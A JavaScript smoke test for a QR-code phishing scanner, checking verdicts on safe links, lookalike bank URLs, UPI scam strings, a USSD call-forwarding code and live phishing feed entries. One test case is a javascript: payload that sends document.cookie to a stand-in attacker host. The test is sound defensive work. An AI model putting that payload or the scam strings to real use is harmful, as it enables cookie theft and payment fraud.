// End-to-end detection test against a running QRShield API.
// Usage: node backend/tests/smoke.mjs [baseUrl]   (default http://localhost:8889)
// Known-malicious samples are pulled live from the OpenPhish / Phishing Army feeds so they are real, current threats.
const BASE = process.argv[2] ?? "http://localhost:8889";
const CID = crypto.randomUUID();

async function liveSamples() {
  const op = (await (await fetch("https://openphish.com/feed.txt")).text()).split("\n").filter(Boolean);
  const pa = (await (await fetch("https://phishing.army/download/phishing_army_blocklist.txt")).text())
    .split("\n").filter((l) => l && !l.startsWith("#") && !l.includes("amiprotected"));
  return { openphish: op[3], phishingArmy: `https://${pa[Math.floor(pa.length / 2)]}/login` };
}

const { openphish, phishingArmy } = await liveSamples();
const cases = [
  // [label, content, expected verdicts]
  ["Safe: google.com", "https://www.google.com", ["SAFE"]],
  ["Safe: wikipedia article", "https://en.wikipedia.org/wiki/QR_code", ["SAFE"]],
  ["Safe: github login (official)", "https://github.com/login", ["SAFE"]],
  ["Safe: bare domain manual entry", "netlify.com", ["SAFE"]],
  ["Safe: UPI merchant", "upi://pay?pa=sharmastores@okaxis&pn=Sharma%20General%20Stores&am=250.00&cu=INR&tn=Order%2045", ["SAFE"]],
  ["Safe: UPI person (phone VPA)", "upi://pay?pa=9876543210@ybl&pn=Ravi%20Kumar", ["SAFE"]],
  ["Safe: UPI Paytm merchant", "upi://pay?pa=paytmqr2810050501011abcdef@paytm&pn=Paytm%20Merchant&mc=5411&tr=TXN123", ["SAFE"]],
  ["Safe: Wi-Fi WPA2", "WIFI:T:WPA;S:HomeNet;P:correct-horse;;", ["SAFE"]],
  ["Safe: plain text", "Table 12 - Welcome to Cafe Aroma", ["SAFE"]],
  ["Suspicious: brand + KYC on .xyz", "http://paytm-kyc-update.xyz/login", ["SUSPICIOUS", "DANGEROUS"]],
  ["Suspicious: typosquat paypa1", "https://paypa1.com/signin", ["SUSPICIOUS", "DANGEROUS"]],
  ["Suspicious: SBI lookalike", "https://sbi-netbanking-verify.top/account/update", ["SUSPICIOUS", "DANGEROUS"]],
  ["Suspicious: private IP", "http://192.168.1.1/admin", ["SUSPICIOUS"]],
  ["Suspicious: @ trick", "https://www.icicibank.com@198.51.100.7/login", ["SUSPICIOUS", "DANGEROUS"]],
  ["Suspicious: APK download", "https://example.com/files/sbi-yono-update.apk", ["SUSPICIOUS"]],
  ["Suspicious: UPI refund scam", "upi://pay?pa=refund.desk@ybl&pn=SBI%20Customer%20Care&am=4999&tn=Scan%20to%20receive%20refund", ["SUSPICIOUS"]],
  ["Suspicious: UPI duplicate payee", "upi://pay?pa=shop@okaxis&pa=thief@ybl&pn=Shop&am=100", ["SUSPICIOUS"]],
  ["Suspicious: USSD call forwarding", "tel:*401*9876543210", ["SUSPICIOUS"]],
  ["Dangerous: javascript payload", "javascript:fetch('//evil.example/'+document.cookie)", ["DANGEROUS"]],
  ["Dangerous: live OpenPhish URL", openphish, ["DANGEROUS"]],
  ["Dangerous: live Phishing Army domain", phishingArmy, ["DANGEROUS"]],
  ["GSB test page (needs API key)", "https://testsafebrowsing.appspot.com/s/phishing.html", ["DANGEROUS", "SAFE"]],
];

let pass = 0;
for (const [label, content, expect] of cases) {
  const t = Date.now();
  const res = await fetch(`${BASE}/api/scan`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "X-Client-Id": CID },
    body: JSON.stringify({ content, source: "manual" }),
  });
  const j = await res.json();
  const v = j.scan?.verdict ?? `HTTP ${res.status}`;
  const ok = expect.includes(v);
  pass += ok;
  console.log(`${ok ? "PASS" : "FAIL"} ${v.padEnd(10)} ${String(j.scan?.riskScore).padStart(3)}  ${label}  (${Date.now() - t}ms, saved=${j.saved})`);
  console.log(`      ${content.slice(0, 90)}`);
  console.log(`      ${j.scan?.summary}`);
  for (const r of (j.scan?.reasons ?? []).filter((r) => r.weight > 0).slice(0, 4)) console.log(`        - [${r.severity}] +${r.weight} ${r.title}`);
}
console.log(`\n${pass}/${cases.length} passed. Client: ${CID}`);
